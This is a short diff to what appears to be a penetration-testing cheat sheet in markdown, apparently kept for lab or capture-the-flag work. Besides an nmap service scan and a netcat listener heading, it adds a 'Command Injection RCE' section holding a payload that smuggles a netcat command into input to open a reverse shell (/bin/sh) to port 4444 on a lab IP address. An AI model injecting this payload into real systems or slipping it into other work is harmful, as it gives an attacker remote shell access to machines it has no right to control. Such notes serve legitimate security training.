@@ -8,6 +8,12 @@
  sudo nmap -p 80 {ip} -sV
 ````
 
+## Command Injection RCE
+
+```bash
+; nc 192.168.45.179 4444 -e /bin/sh; 
+```
+
 ## Netcat Listener
 
 ```bash
